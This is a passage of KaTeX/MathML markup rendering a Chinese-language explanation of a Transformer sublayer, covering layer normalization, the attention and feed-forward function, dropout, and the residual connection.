displaystyle=\"true\"><mrow><mrow></mrow><mi>g</mi><mo stretchy=\"false\">(</mo><mrow><mi mathvariant=\"normal\">L</mi><mi mathvariant=\"normal\">a</mi><mi mathvariant=\"normal\">y</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">N</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">m</mi></mrow><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>对于</mtext><mi>F</mi><mi>F</mi><mi>N</mi><mo separator=\"true\">,</mo><mtext>函数</mtext><mi>g</mi><mtext>的具体形式为</mtext><mo>:</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mi>g</mi><mo stretchy=\"false\">(</mo><mrow><mi mathvariant=\"normal\">L</mi><mi mathvariant=\"normal\">a</mi><mi mathvariant=\"normal\">y</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">N</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">m</mi></mrow><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo><mo>=</mo><mrow><mi mathvariant=\"normal\">R</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">L</mi><mi mathvariant=\"normal\">U</mi></mrow><mo stretchy=\"false\">(</mo><mrow><mi mathvariant=\"normal\">L</mi><mi mathvariant=\"normal\">a</mi><mi mathvariant=\"normal\">y</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">N</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">m</mi></mrow><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><msup><mi mathvariant=\"bold\">W</mi><mrow><mo stretchy=\"false\">(</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow></msup><mo>+</mo><msup><mi mathvariant=\"bold\">b</mi><mrow><mo stretchy=\"false\">(</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow></msup><mo stretchy=\"false\">)</mo><msup><mi mathvariant=\"bold\">W</mi><mrow><mo stretchy=\"false\">(</mo><mn>2</mn><mo stretchy=\"false\">)</mo></mrow></msup><mo>+</mo><msup><mi mathvariant=\"bold\">b</mi><mrow><mo stretchy=\"false\">(</mo><mn>2</mn><mo stretchy=\"false\">)</mo></mrow></msup></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>4.Dropout:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo separator=\"true\">⋅</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>在应用函数 </mtext><mi>g</mi><mtext> 之后,对结果应用Dropout,以防止过拟合:</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mrow><mi mathvariant=\"normal\">D</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">p</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">u</mi><mi mathvariant=\"normal\">t</mi></mrow><mo stretchy=\"false\">(</mo><mi>g</mi><mo stretchy=\"false\">(</mo><mrow><mi mathvariant=\"normal\">L</mi><mi mathvariant=\"normal\">a</mi><mi mathvariant=\"normal\">y</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">N</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">m</mi></mrow><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>Dropout的具体操作是在每次训练</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mtext>5. 残差连接(Residual Connection):</mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><mo separator=\"true\">⋅</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mtext>最后,将Dropout的结果与原输入 </mtext><mi>x</mi><mtext> 相加,实现残差连接</mtext><mo>:</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"true\"><mrow><mrow></mrow><msup><mi>g</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo>=</mo><mi>x</mi><mo>+</mo><mrow><mi mathvariant=\"normal\">D</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">p</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">u</mi><mi mathvariant=\"normal\">t</mi></mrow><mo stretchy=\"false\">(</mo><mi>g</mi><mo stretchy=\"false\">(</mo><mrow><mi mathvariant=\"normal\">L</mi><mi mathvariant=\"normal\">a</mi><mi mathvariant=\"normal\">y</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">N</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">r</mi><mi mathvariant=\"normal\">m</mi></mrow><mo stretchy=\"false\">(</mo><mi>x</mi><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo><mo stretchy=\"false\">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding=\"application/x-tex\">\\begin{aligned}\n&amp;1.\\text{ 输入 }x: \\\\\n&amp;·x是上一层的输出或者当前层的输入。 \\\\\n&amp;\\text{2. 层归一化(Layer Normalization):} \\\\\n&amp;\\bullet\\text{ 首先对输入 }x\\text{ 进行层归一化:} \\\\\n&amp;\\mathrm{LayerNorm}(x)=\\frac{x-\\mu}{\\sqrt{\\sigma^{2}+\\epsilon}}\\cdot\\gamma+\\beta \\\\\n&amp;\\text{缩放和偏移参数。} \\\\\n&amp;\\text{3. 应用函数 }g: \\\\\n&amp;· \\\\\n&amp;注意力机制(SA): \\\\\n&amp;g(\\mathrm{LayerNorm}(x)) \\\\\n&amp;对于FFN,函数g的具体形式为: \\\\\n&amp;&amp;&amp;g(\\mathrm{LayerNorm}(x))=\\mathrm{ReLU}(\\mathrm{LayerNorm}(x)\\mathbf{W}^{(1)}+\\mathbf{b}^{(1)})\\mathbf{W}^{(2)}+\\mathbf{b}^{(2)} \\\\\n&amp;\\text{4.Dropout:} \\\\\n&amp;·&amp;&amp; \\text{在应用函数 }g\\text{ 之后,对结果应用Dropout,以防止过拟合:} \\\\\n&amp;&amp;&amp;\\mathrm{Dropout}(g(\\mathrm{LayerNorm}(x))) \\\\\n&amp;&amp;&amp;\\text{Dropout的具体操作是在每次训练} \\\\\n&amp; \\text{5. 残差连接(Residual Connection):} \\\\\n&amp;·&amp;&amp;&amp; \\text{最后,将Dropout的结果与原输入 }x\\text{ 相加,实现残差连接}: \\\\\n&amp;&amp;&amp;g&#x27;(x)=x+\\mathrm{Dropout}(g(\\mathrm{LayerNorm}(x)))\n\\end{aligned}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:29.588330000000003em;vertical-align:-14.544165000000001em;\"></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:15.044165000000001em;\"><span style=\"top:-17.464495000000003em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:-15.964495000000001em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:-14.464495em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:-12.964495em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:-11.044165em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:-8.974165em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:-7.474164999999999em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:-5.974164999999999em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:-4.474164999999999em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:-2.9741649999999997em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:-1.474164999999998em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:0.12383500000000103em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:1.623835000000001em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:3.123835000000001em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:4.6238350000000015em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:6.1238350000000015em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:7.6238350000000015em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:9.123835000000001em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span><span style=\"top:10.623835000000001em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:14.544165000000001em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:15.044165000000001em;\"><span style=\"top:-17.464495000000003em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">输入</span><span class=\"mord\"> </span></span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span></span><span style=\"top:-15.964495000000001em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mpunct\">⋅</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">x</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">上</span><span class=\"mord cjk_fallback\">一</span><span class=\"mord cjk_fallback\">层</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">输</span><span class=\"mord cjk_fallback\">出</span><span class=\"mord cjk_fallback\">或</span><span class=\"mord cjk_fallback\">者</span><span class=\"mord cjk_fallback\">当</span><span class=\"mord cjk_fallback\">前</span><span class=\"mord cjk_fallback\">层</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">输</span><span class=\"mord cjk_fallback\">入</span><span class=\"mord cjk_fallback\">。</span></span></span><span style=\"top:-14.464495em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">2. </span><span class=\"mord cjk_fallback\">层归一化</span><span class=\"mord\">(Layer Normalization):</span></span></span></span><span style=\"top:-12.964495em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∙</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">首先对输入</span><span class=\"mord\"> </span></span><span class=\"mord mathnormal\">x</span><span class=\"mord text\"><span class=\"mord\"> </span><span class=\"mord cjk_fallback\">进行层归一化</span><span class=\"mord\">:</span></span></span></span><span style=\"top:-11.044165em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord\"><span class=\"mord mathrm\">L</span><span class=\"mord mathrm\">a</span><span class=\"mord mathrm\" style=\"margin-right:0.01389em;\">y</span><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">N</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">m</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mopen nulldelimiter\"></span><span class=\"mfrac\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.2603300000000002em;\"><span style=\"top:-2.196611em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord sqrt\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.913389em;\"><span class=\"svg-align\" style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\" style=\"padding-left:0.833em;\"><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">σ</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.740108em;\"><span style=\"top:-2.9890000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">ϵ</span></span></span><span style=\"top:-2.873389em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"hide-tail\" style=\"min-width:0.853em;height:1.08em;\"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702\nc-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14\nc0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54\nc44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10\ns173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429\nc69,-144,104.5,-217.7,106.5,-221\nl0 -0\nc5.3,-9.3,12,-14,20,-14\nH400000v40H845.2724\ns-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7\nc-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z\nM834 80h400000v40h-400000z'/></svg></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.12661100000000003em;\"><span></span></span></span></span></span></span></span><span style=\"top:-3.23em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"frac-line\" style=\"border-bottom-width:0.04em;\"></span></span><span style=\"top:-3.677em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\">μ</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.93em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">⋅</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05556em;\">γ</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05278em;\">β</span></span></span><span style=\"top:-8.974165em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord cjk_fallback\">缩放和偏移参数。</span></span></span></span><span style=\"top:-7.474164999999999em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">3. </span><span class=\"mord cjk_fallback\">应用函数</span><span class=\"mord\"> </span></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span></span><span style=\"top:-5.974164999999999em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mpunct\">⋅</span></span></span><span style=\"top:-4.474164999999999em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord cjk_fallback\">注</span><span class=\"mord cjk_fallback\">意</span><span class=\"mord cjk_fallback\">力</span><span class=\"mord cjk_fallback\">机</span><span class=\"mord cjk_fallback\">制</span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\">A</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span></span><span style=\"top:-2.9741649999999997em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathrm\">L</span><span class=\"mord mathrm\">a</span><span class=\"mord mathrm\" style=\"margin-right:0.01389em;\">y</span><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">N</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">m</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mclose\">)</span></span></span><span style=\"top:-1.474164999999998em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord cjk_fallback\">对</span><span class=\"mord cjk_fallback\">于</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">F</span><span class=\"mord mathnormal\" style=\"margin-right:0.10903em;\">N</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord cjk_fallback\">函</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">具</span><span class=\"mord cjk_fallback\">体</span><span class=\"mord cjk_fallback\">形</span><span class=\"mord cjk_fallback\">式</span><span class=\"mord cjk_fallback\">为</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">:</span></span></span><span style=\"top:0.12383500000000103em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span><span style=\"top:1.623835000000001em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">4.Dropout:</span></span></span></span><span style=\"top:3.123835000000001em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mpunct\">⋅</span></span></span><span style=\"top:4.6238350000000015em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span><span style=\"top:6.1238350000000015em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span><span style=\"top:7.6238350000000015em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord\">5. </span><span class=\"mord cjk_fallback\">残差连接</span><span class=\"mord\">(Residual Connection):</span></span></span></span><span style=\"top:9.123835000000001em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mpunct\">⋅</span></span></span><span style=\"top:10.623835000000001em;\"><span class=\"pstrut\" style=\"height:3.26033em;\"></span><span class=\"mord\"><span class=\"mord\"></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:14.544165000000001em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:1em;\"></span><span class=\"col-align-r\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:-2.4461650000000015em;\"><span style=\"top:0.4461650000000015em;\"><span class=\"pstrut\" style=\"height:2.9379999999999997em;\"></span><span class=\"mord\"></span></span><span style=\"top:3.4461650000000015em;\"><span class=\"pstrut\" style=\"height:2.9379999999999997em;\"></span><span class=\"mord\"></span></span><span style=\"top:4.9461650000000015em;\"><span class=\"pstrut\" style=\"height:2.9379999999999997em;\"></span><span class=\"mord\"></span></span><span style=\"top:6.4461650000000015em;\"><span class=\"pstrut\" style=\"height:2.9379999999999997em;\"></span><span class=\"mord\"></span></span><span style=\"top:9.446165em;\"><span class=\"pstrut\" style=\"height:2.9379999999999997em;\"></span><span class=\"mord\"></span></span><span style=\"top:10.946165em;\"><span class=\"pstrut\" style=\"height:2.9379999999999997em;\"></span><span class=\"mord\"></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:14.544165000000001em;\"><span></span></span></span></span></span><span class=\"col-align-l\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:-2.4461650000000015em;\"><span style=\"top:0.3841650000000012em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathrm\">L</span><span class=\"mord mathrm\">a</span><span class=\"mord mathrm\" style=\"margin-right:0.01389em;\">y</span><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">N</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">m</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">R</span><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">L</span><span class=\"mord mathrm\">U</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathrm\">L</span><span class=\"mord mathrm\">a</span><span class=\"mord mathrm\" style=\"margin-right:0.01389em;\">y</span><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">N</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">r</span><span class=\"mord mathrm\">m</span></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">x</span><span class=\"mclose\">)</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.938em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">1</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">b</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.938em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">1</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.938em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">2</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">b</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.938em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">2</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span></span></span><span style=\"top:3.384165000000001em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"></span><span class=\"mord text\"><span class=\"mord 